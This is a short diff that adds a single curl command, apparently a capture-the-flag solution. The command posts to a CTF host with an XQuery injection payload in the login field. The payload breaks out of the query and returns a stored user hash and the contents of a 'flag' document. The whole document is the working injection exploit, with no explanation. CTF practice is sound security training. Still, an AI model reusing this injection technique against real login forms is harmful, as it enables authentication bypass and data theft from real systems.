@@ -1,0 +1,5 @@
+curl
+https://ohfuk.spb.ctf.su/
+-vk
+-F "pass=test"
+-F 'login=" or 1) then ^<result^>{$user/hash}^<level^>{data(doc("flag"))}^</level^>^</result^> else if ("'
